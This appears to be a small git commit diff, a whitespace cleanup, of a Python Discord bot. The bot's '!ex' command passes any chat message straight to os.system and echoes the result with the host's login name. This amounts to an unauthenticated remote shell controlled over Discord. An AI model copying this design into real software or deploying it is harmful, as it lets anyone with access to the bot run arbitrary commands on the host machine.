62dba00099c5682f5e5f85628acaf71e4ce8319e
ZSendokame <70088953+ZSendokame@users.noreply.github.com>
2021-09-24 14:20:20 -0300

    Update index.py

--- index.py
+++ index.py
@@ -1,23 +1,15 @@
 import os
 from discord.ext import commands
 
-
-
-
 # Config
 Discord_Token = 'TOKEN'
 bot = commands.Bot(command_prefix = '!')
 get_name = os.getlogin()
 
-
-
-
 @bot.command(name = 'ex')
 async def Execute_command(ctx, arg):
-
     os.system(arg)
 
     await ctx.send(f'{get_name} Console\n\n{arg}')
-
 
 bot.run(Discord_Token)
